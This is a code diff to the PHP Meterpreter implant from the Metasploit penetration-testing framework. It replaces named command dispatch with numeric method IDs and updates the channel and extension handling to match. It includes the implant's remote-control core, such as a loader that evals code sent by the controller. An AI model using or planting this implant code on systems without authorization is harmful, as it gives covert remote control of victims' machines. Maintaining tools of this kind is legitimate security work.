@@ -32,19 +32,44 @@ if (!isset($GLOBALS['readers'])) {
 
 # global list of extension commands
 if (!isset($GLOBALS['commands'])) {
-    $GLOBALS['commands'] = array("core_loadlib", "core_machine_id", "core_set_uuid",
-        "core_set_session_guid", "core_get_session_guid", "core_negotiate_tlv_encryption");
-}
-
-function register_command($c) {
-    global $commands;
-    if (! in_array($c, $commands)) {
-        array_push($commands, $c);
-    }
+    $GLOBALS['commands'] = [
+        1000 => 'core_channel_close',
+        1001 => 'core_channel_eof',
+        1002 => 'core_channel_interact',
+        1003 => 'core_channel_open',
+        1004 => 'core_channel_read',
+        1007 => 'core_channel_write',
+        1009 => 'core_enumextcmd',
+        1010 => 'core_get_session_guid',
+        1011 => 'core_loadlib',
+        1012 => 'core_machine_id',
+        1015 => 'core_negotiate_tlv_encryption',
+        1021 => 'core_set_session_guid',
+        1022 => 'core_set_uuid',
+        1023 => 'core_shutdown',
+    ];
 }
 
 function my_print($str) {
     #error_log($str);
+}
+
+function register_command($i, $c) {
+    global $commands;
+    my_print("Registering command {$i} as {$c}");
+    $commands[$i] = $c;
+}
+
+function name_to_method_id($name) {
+    my_print("[!] Searching ID for method {$name}");
+    global $commands;
+    return array_search($name, $commands);
+}
+
+function method_id_to_name($method_id) {
+    my_print("[!] Searching method for id {$method_id}");
+    global $commands;
+    return $commands[$method_id];
 }
 
 my_print("Evaling main meterpreter stage");
@@ -66,19 +91,21 @@ function dump_array($arr, $name=null) {
         }
     }
 }
+
 function dump_readers() {
     global $readers;
     dump_array($readers, 'Readers');
 }
+
 function dump_resource_map() {
     global $resource_type_map;
     dump_array($resource_type_map, 'Resource map');
 }
+
 function dump_channels($extra="") {
     global $channels;
     dump_array($channels, 'Channels '.$extra);
 }
-
 
 # Doesn't exist before php 4.3
 if (!function_exists("file_get_contents")) {
@@ -157,6 +184,7 @@ define("TLV_TYPE_METHOD",              TLV_META_TYPE_STRING |   1);
 define("TLV_TYPE_REQUEST_ID",          TLV_META_TYPE_STRING |   2);
 define("TLV_TYPE_EXCEPTION",           TLV_META_TYPE_GROUP  |   3);
 define("TLV_TYPE_RESULT",              TLV_META_TYPE_UINT   |   4);
+define("TLV_TYPE_METHOD_ID",           TLV_META_TYPE_UINT   |   5);
 
 define("TLV_TYPE_STRING",              TLV_META_TYPE_STRING |  10);
 define("TLV_TYPE_UINT",                TLV_META_TYPE_UINT   |  11);
@@ -434,8 +462,8 @@ function core_loadlib($req, &$pkt) {
         eval($data_tlv['value']);
     }
     $new = array_diff($commands, $tmp);
-    foreach ($new as $meth) {
-        packet_add_tlv($pkt, create_tlv(TLV_TYPE_METHOD, $meth));
+    foreach (array_keys($new) as $method_id) {
+        packet_add_tlv($pkt, create_tlv(TLV_TYPE_UINT, $method_id));
     }
 
     return ERROR_SUCCESS;
@@ -450,10 +478,10 @@ function core_enumextcmd($req, &$pkt) {
   $extension_name_tlv = packet_get_tlv($req, TLV_TYPE_STRING);;
   $expected_ext_name = $extension_name_tlv['value'];
 
-  foreach ($commands as $ext_cmd) {
-    list($ext_name, $cmd) = explode("_", $ext_cmd, 2);
+  foreach (array_keys($commands) as $method_id) {
+    list($ext_name, $cmd) = explode("_", $commands[$method_id], 2);
     if ($ext_name == $expected_ext_name) {
-      packet_add_tlv($pkt, create_tlv(TLV_TYPE_STRING, $cmd));
+      packet_add_tlv($pkt, create_tlv(TLV_TYPE_UINT, $method_id));
     }
   }
   return ERROR_SUCCESS;
@@ -768,7 +796,7 @@ function handle_dead_resource_channel($resource) {
 
         # Notify the client that this channel is dead
         $pkt = pack("N", PACKET_TYPE_REQUEST);
-        packet_add_tlv($pkt, create_tlv(TLV_TYPE_METHOD, 'core_channel_close'));
+        packet_add_tlv($pkt, create_tlv(TLV_TYPE_METHOD_ID, name_to_method_id('core_channel_close')));
         packet_add_tlv($pkt, create_tlv(TLV_TYPE_REQUEST_ID, generate_req_id()));
         packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_ID, $cid));
         packet_add_tlv($pkt, create_tlv(TLV_TYPE_UUID, $GLOBALS['UUID']));
@@ -786,7 +814,7 @@ function handle_resource_read_channel($resource, $data) {
 
     # Build a new Packet
     $pkt = pack("N", PACKET_TYPE_REQUEST);
-    packet_add_tlv($pkt, create_tlv(TLV_TYPE_METHOD, 'core_channel_write'));
+    packet_add_tlv($pkt, create_tlv(TLV_TYPE_METHOD_ID, name_to_method_id('core_channel_write')));
     if (array_key_exists((int)$resource, $udp_host_map)) {
         list($h,$p) = $udp_host_map[(int)$resource];
         packet_add_tlv($pkt, create_tlv(TLV_TYPE_PEER_HOST, $h));
@@ -806,17 +834,17 @@ function handle_resource_read_channel($resource, $data) {
 function create_response($req) {
     $pkt = pack("N", PACKET_TYPE_RESPONSE);
 
-    $method_tlv = packet_get_tlv($req, TLV_TYPE_METHOD);
-    my_print("method is {$method_tlv['value']}");
+    $method_tlv = packet_get_tlv($req, TLV_TYPE_METHOD_ID);
+    $method = method_id_to_name($method_tlv['value']);
     packet_add_tlv($pkt, $method_tlv);
 
     $reqid_tlv = packet_get_tlv($req, TLV_TYPE_REQUEST_ID);
     packet_add_tlv($pkt, $reqid_tlv);
 
-    if (is_callable($method_tlv['value'])) {
-        $result = $method_tlv['value']($req, $pkt);
+    if (is_callable($method)) {
+        $result = $method($req, $pkt);
     } else {
-        my_print("Got a request for something I don't know how to handle (". $method_tlv['value'] ."), returning failure");
+        my_print("Got a request for something I don't know how to handle (". $method ."), returning failure");
         $result = ERROR_FAILURE;
     }
 
